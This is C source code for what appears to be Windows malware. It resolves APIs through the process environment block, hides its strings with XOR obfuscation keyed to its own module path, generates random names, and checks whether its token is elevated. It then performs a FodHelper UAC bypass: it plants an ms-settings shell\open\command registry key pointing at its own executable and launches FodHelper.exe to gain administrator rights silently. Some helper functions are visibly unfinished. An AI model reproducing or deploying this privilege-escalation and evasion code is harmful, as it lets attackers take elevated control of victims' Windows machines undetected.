#include "VxHeader.h"

PPEB RtlGetPeb(VOID)
{
	return (PPEB)__readgsqword(0x60);
}

PTEB RtlGetTeb(VOID)
{
	return (PTEB)NtCurrentTeb();
}

DWORD VxHashString(PBYTE String)
{
	DWORD dwHash = 0x1505;
	INT nX;

	while (nX = *String++)
		dwHash = ((dwHash << 0x5) + dwHash) + nX;

	return dwHash;
}

BOOL VxGenerateFileNameTable(PAPI_TABLE Api)
{
	PPEB Peb = RtlGetPeb();

	VxPseudoRandomStringGeneration(Api->FileNames.g_szClassName, Peb->ProcessHeap, Api);
	VxPseudoRandomStringGeneration(Api->FileNames.g_szFileName, Peb->ProcessHeap, Api);
	VxPseudoRandomStringGeneration(Api->FileNames.g_szModuleName, Peb->ProcessHeap, Api);

	return TRUE;

}

VOID VxPseudoRandomStringGeneration(PWCHAR pBlock, HANDLE hHeap, PAPI_TABLE Api)
{
	LPWSTR String = NULL;
	PUNICODE_STRING Key = VxGetPassword();
	DWORD32 dwX = ERROR_SUCCESS;
	DWORD32 dwSize = ERROR_SUCCESS;
	WCHAR Variations[64] = {0x22, 0x58, 0x3F, 0x33, 0x2C, 0x28, 0x23, 0x27, 0x3E, 0x39, 0x37, 0x3F, 0x34,
							0x3D, 0x3B, 0x35, 0x3C, 0x41, 0x41, 0x28, 0x1B, 0x02, 0x13, 0x14, 0x15, 0x54,
							0x25, 0x2E, 0x2F, 0x07, 0x7F, 0x1A, 0x10, 0x01, 0x07, 0x0E, 0x04, 0x1B, 0x1E,
							0x12, 0x1C, 0x09, 0x02, 0x06, 0x16, 0x19, 0x66, 0x64, 0x0B, 0x36, 0x2D, 0x3E,
							0x5C, 0x5D, 0x1C, 0x57, 0x58, 0x59, 0x75, 0x0A, 0x64, 0x6E, 0x00 };

	String = (LPWSTR)Api->RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, WMAX_PATH);
	if (String == NULL)
		return;

	dwSize = 62;
	VxDecrypt64(Key->Buffer, Variations, 62, String);
	for (; dwX < 0x0a; dwX++)
	{
		DWORD32 dwKey = VxPseudoRandom() % dwSize;
		pBlock[dwX] = String[dwKey];
	}

	pBlock[dwX - 1] = '\0';
	Api->RtlFreeHeap(hHeap, HEAP_ZERO_MEMORY, String);
}

PUNICODE_STRING VxGetPassword(VOID)
{
	PPEB Peb = RtlGetPeb();
	PLDR_MODULE pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - InMemoryOrderModuleListDelta);

	return &pLoadModule->FullDllName;
}

VOID VxDecrypt64(PWCHAR Key, PWCHAR String, DWORD32 dwSize, PWCHAR Out)
{
	DWORD32 dwX = 0;
	DWORD64 dwLength = VxStringLength(Key);

	for (; dwX < dwSize; dwX++){Out[dwX] = String[dwX] ^ Key[dwX % dwLength];}
}

BOOL VxDetermineTargetAndEscalation(PAPI_TABLE Api)
{
	PPEB Peb = RtlGetPeb();
	DWORD dwSize = sizeof(TOKEN_ELEVATION);
	BOOL bAdmin;
	HANDLE hToken;
	TOKEN_ELEVATION Elevation;

	if (Api->NtOpenProcessTokenEx(((HANDLE)-1), TOKEN_QUERY, 0, &hToken) != ERROR_SUCCESS)
		goto FAILURE;

	if (Api->NtQueryInformationToken(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize) != ERROR_SUCCESS)
		goto FAILURE;
	else
		bAdmin = Elevation.TokenIsElevated;

	if (!bAdmin)
	{
		if ((Peb->OSMajorVersion == 10 && Peb->OSMinorVersion == 0))
		{
			if (!VxCreateFodHelperRegistryKey(NULL, Api))
				goto FAILURE;

			if (!VxExecuteFodHelper(Api))
				goto FAILURE;
		}
	}

	if (hToken)
		Api->NtClose(hToken);

	return TRUE;

FAILURE:

	if (hToken)
		Api->NtClose(hToken);

	return FALSE;
}

BOOL VxCreateFodHelperRegistryKey(PUNICODE_STRING Parameters, PAPI_TABLE Api)
{
	PPEB Peb = RtlGetPeb();
	NTSTATUS Status;
	HANDLE hHandle;
	UNICODE_STRING Sid;
	PUNICODE_STRING Key = VxGetPassword();
	UNICODE_STRING uString;

	WCHAR String2[MAX_PATH]		 =  { 0 };
	WCHAR RegistryPrepender[16]	 =	{ 0x1F, 0x68, 0x39, 0x30, 0x20, 0x3D, 0x30, 0x3D, 0x2E, 0x0F, 0x09, 0x20, 0x3C, 0x21, 0x08, 0x00 };
	WCHAR vxRegSoftware[10]		 =	{ 0x1f, 0x69, 0x33, 0x31, 0x3d, 0x39, 0x25, 0x3d, 0x32, 0x00 };
	WCHAR vxRegClasses[9]		 =	{ 0x1f, 0x79, 0x30, 0x36, 0x3a, 0x3d, 0x21, 0x3c, 0x00 };
	WCHAR vxMsSettings[13]		 =	{ 0x1f, 0x57, 0x2f, 0x7a, 0x3a, 0x2b, 0x30, 0x3b, 0x3e, 0x3d, 0x3b, 0x20, 0x00 };
	WCHAR vxShell[7]			 =	{ 0x1f, 0x49, 0x34, 0x32, 0x25, 0x22, 0x00 };
	WCHAR vxOpen[6]				 =	{ 0x1f, 0x55, 0x2c, 0x32, 0x27, 0x00 };
	WCHAR vxCommand[9]			 =  { 0x1f, 0x59, 0x33, 0x3a, 0x24, 0x2f, 0x2a, 0x2b, 0x00 };
	WCHAR vxDelegate[17]		 =	{ 0x07, 0x5f, 0x30, 0x32, 0x2e, 0x2f, 0x30, 0x2a, 0x12, 0x2b, 0x39, 0x30, 0x2c, 0x27, 0x31, 0x00 };

	WCHAR *Subs[4]				 =	{ vxMsSettings, vxShell, vxOpen, vxCommand };
	DWORD SubLength[4]			 =  { 12, 6, 5, 8 };

	DWORD dwNest = 4;
	DWORD dwX = 0;

	LPVOID Strings = Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, WMAX_PATH);
	if (Strings == NULL)
		return FALSE;

	VxDecrypt64(Key->Buffer, RegistryPrepender, 15, (PWCHAR)Strings);
	if (!VxGetUserSid(&Sid, Api))
		goto FAILURE;

	VxStringConcatW((PWCHAR)Strings, Sid.Buffer);

	VxDecrypt64(Key->Buffer, vxRegSoftware, 9, String2);
	VxStringConcatW((PWCHAR)Strings, String2);
	VxZeroMemory(String2, MAX_PATH);

	VxDecrypt64(Key->Buffer, vxRegClasses, 8, String2);
	VxStringConcatW((PWCHAR)Strings, String2);
	VxZeroMemory(String2, MAX_PATH);

	for (; dwX < dwNest; dwX++)
	{
		OBJECT_ATTRIBUTES Attributes;

		VxDecrypt64(Key->Buffer, Subs[dwX], SubLength[dwX], String2);
		VxStringConcatW((PWCHAR)Strings, String2);
		VxZeroMemory(String2, MAX_PATH);

		Api->RtlInitUnicodeString(&uString, (PWCHAR)Strings);
		InitializeObjectAttributes(&Attributes, &uString, OBJ_KERNEL_HANDLE, NULL, NULL);

		Status = Api->ZwCreateKey(&hHandle, KEY_ALL_ACCESS, &Attributes, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
		if (Status != ERROR_SUCCESS)
			goto FAILURE;
	}

	VxZeroMemory(String2, MAX_PATH);
	VxZeroMemory(&uString, sizeof(UNICODE_STRING));

	Api->RtlInitUnicodeString(&uString, L"");

	
	Status = Api->ZwSetValueKey(hHandle, &uString, 0, REG_SZ, 
							   (Parameters == NULL ? (PBYTE)Api->UserProcessInfo->ImagePathName.Buffer : (PBYTE)Parameters->Buffer), 
							   (Parameters == NULL ? (ULONG)Api->UserProcessInfo->ImagePathName.Length : (ULONG)Parameters->Length));
	if (Status != ERROR_SUCCESS)
		goto FAILURE;
	else
		VxZeroMemory(&uString, sizeof(UNICODE_STRING));

	VxDecrypt64(Key->Buffer, vxDelegate, 15, String2);
	Api->RtlInitUnicodeString(&uString, String2);

	Status = Api->ZwSetValueKey(hHandle, &uString, uString.Length, REG_SZ, L"", 1);
	if (Status != ERROR_SUCCESS)
		goto FAILURE;

	Api->ZwClose(hHandle);

	if (Strings != NULL)
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, Strings);

	return TRUE;

FAILURE:

	if (hHandle)
		Api->ZwClose(hHandle);

	if (Strings != NULL)
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, Strings);

	return FALSE;
}

BOOL VxGetUserSid(PUNICODE_STRING uString, PAPI_TABLE Api)
{
	PPEB Peb = RtlGetPeb();
	PTOKEN_USER pUser = NULL;
	HANDLE hUserSid;
	DWORD dwTokenSize = ERROR_SUCCESS;
	NTSTATUS Status;

	if (Api->NtOpenProcessTokenEx((HANDLE)-1, 0x0008, 0, &hUserSid) != 0x00000000)
		return FALSE;

	Status = Api->NtQueryInformationToken(hUserSid, TokenUser, pUser, dwTokenSize, &dwTokenSize);
	if (Status != 0x00000000 && Status != 0xc0000023)
		goto FAILURE;

	pUser = (PTOKEN_USER)Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, dwTokenSize);
	if (pUser == NULL)
		return FALSE;

	if (Api->NtQueryInformationToken(hUserSid, TokenUser, pUser, dwTokenSize, &dwTokenSize) != 0x00000000)
		goto FAILURE;

	if (!Api->RtlValidSid(pUser->User.Sid))
		goto FAILURE;

	if (Api->RtlConvertSidToUnicodeString(uString, pUser->User.Sid, TRUE) != 0x00000000)
		goto FAILURE;
	else
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, pUser);

	if (hUserSid)
		Api->NtClose(hUserSid);

	return TRUE;

FAILURE:

	if (pUser)
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, pUser);

	if (hUserSid)
		Api->NtClose(hUserSid);

	return FALSE;
}

BOOL VxExecuteFodHelper(PAPI_TABLE Api)
{
	PPEB pPeb = RtlGetPeb();
	PUNICODE_STRING Key = VxGetPassword();
	WCHAR String[MAX_PATH] = { 0 };
	WCHAR Cmd[MAX_PATH] = { 0 };
	PROCESS_INFORMATION Pi;
	STARTUPINFOW Si;

	//WCHAR Target[38] = { 0x6c, 0x59, 0x7c, 0x14, 0x73, 0x12, 0x13, 0x26, 0x39, 0x37, 0x33, 0x24, 0x2a, 0xf, 0x27, 0x3c, 0x3e, 0x47,
	//					 0x57, 0x31, 0x5d, 0x46, 0x38, 0xa, 0x3, 0x4a, 0xc, 0x9, 0x0, 0x33, 0x5f, 0x2e, 0x79, 0x2c, 0x36, 0x21, 0x00 };

	//WCHAR Launcher[28] = { 0x0, 0x0, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0, 0x0, 0x0, 
	//					   0xd, 0x19, 0x0, 0x42, 0x9, 0x56, 0x1, 0x00 };

	//VxDecrypt64(Key->Buffer, Target, 36, String);
	//VxDecrypt64(Key->Buffer, Launcher, 27, Cmd);

	VxZeroMemory(&Si, sizeof(Si));
	VxZeroMemory(&Pi, sizeof(Pi));

	Si.cb = sizeof(STARTUPINFOW);

	if (!Api->CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c C:\\Windows\\System32\\FodHelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &Si, &Pi))
		return FALSE;
	
	if (Pi.hProcess)
		Api->NtClose(Pi.hProcess);

	if (Pi.hThread)
		Api->NtClose(Pi.hThread);

	return TRUE;
}

BOOL CreateCallbackEx(PAPI_TABLE Api, HINSTANCE hInstance, PFILENAME_TABLE Table)
{
	WNDCLASSEX p;

	p.cbSize = sizeof(WNDCLASSEX);
	p.style = 0;
	p.lpfnWndProc = (WNDPROC)WndProc;
	p.cbClsExtra = 0;
	p.cbWndExtra = 0;
	p.hInstance = hInstance;
	p.hIcon = NULL;
	p.hCursor = NULL;
	p.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	p.lpszMenuName = NULL;
	p.lpszClassName = Table->g_szClassName; //uString.Buffer;
	p.hIconSm = NULL;

	if (!Api->vxRegisterClassEx(&p))
		return FALSE;
	else
		return TRUE;
}

VOID VxSetLastError(DWORD dwError)
{
	RtlGetTeb()->LastErrorValue = dwError;
	return;
}

DWORD VxGetLastError(VOID)
{
	PTEB Teb = RtlGetTeb();
	return Teb->LastErrorValue;
}

BOOL VxCreateDataFile(PAPI_TABLE Api)
{
	LPVOID Buffer = NULL;
	LPVOID DecodedString = NULL;
	WCHAR LocalAppData[13] = { 0x0F, 0x75, 0x1F, 0x16, 0x05, 0x0F, 0x14, 0x1F, 0x13, 0x12, 0x08, 0x12, 0x00 };
	WCHAR FileFormat[5] = { 0x6d, 0x4e, 0x24, 0x23, 0x00 };
	IO_STATUS_BLOCK Io; VxZeroMemory(&Io, sizeof(IO_STATUS_BLOCK));
	OBJECT_ATTRIBUTES Attributes; VxZeroMemory(&Attributes, sizeof(OBJECT_ATTRIBUTES));
	UNICODE_STRING uString; VxZeroMemory(&uString, sizeof(UNICODE_STRING));
	PUNICODE_STRING Key = VxGetPassword();
	PPEB Peb = RtlGetPeb();

	Buffer = Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
	if (Buffer == NULL)
		return FALSE;

	DecodedString = Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
	if (DecodedString == NULL)
		goto FAILURE;

	VxDecrypt64(Key->Buffer, LocalAppData, 12, (PWCHAR)DecodedString);
	if (VxGetEnvironmentVariableW(Api, (LPCWSTR)DecodedString, (LPWSTR)Buffer, MAX_PATH) == 0)
		goto FAILURE;

FAILURE:

	if (Buffer)
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, Buffer);

	if (DecodedString)
		Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, DecodedString);

	return FALSE;

}

DWORD VxGetEnvironmentVariableW(PAPI_TABLE Api, LPCWSTR Name, LPWSTR lpBuffer, DWORD dwSize)
{
	PPEB Peb = RtlGetPeb();
	UNICODE_STRING uString; VxZeroMemory(&uString, sizeof(UNICODE_STRING));
	UNICODE_STRING Variable; VxZeroMemory(&Variable, sizeof(UNICODE_STRING));
	DWORD Token[1] = { 61 };
	LPWSTR String = NULL;
	LPWSTR Environment = (LPWSTR)Api->UserProcessInfo->Environment;
	LPWSTR lpszPtr = (LPWSTR)Environment;
	PWCHAR Pointer;

	String = (LPWSTR)Api->RtlAllocateHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, sizeof(WCHAR) * 2);
	VxDecimalToAsciiW(String, Token, 1);

	if (Name != NULL)
		Api->RtlInitUnicodeString(&Variable, (PWCHAR)Name);

	while (*lpszPtr)
	{
		lpszPtr += VxStringLength(lpszPtr) + 1;
		Pointer = VxStringTokenW(lpszPtr, String);
		Pointer = VxCapString(Pointer);

		if (VxStringCompare(lpszPtr, Variable.Buffer) == ERROR_SUCCESS)
		{
			lpszPtr += VxStringLength(lpszPtr) + 1;
			Pointer = VxStringTokenW(lpszPtr, String);
			if (Pointer != NULL)
			{
				Api->RtlInitUnicodeString(&uString, Pointer);
				break;
			}
		}
	}

	Api->RtlFreeUnicodeString(&Variable);
	Api->RtlFreeHeap(Peb->ProcessHeap, HEAP_ZERO_MEMORY, String);

}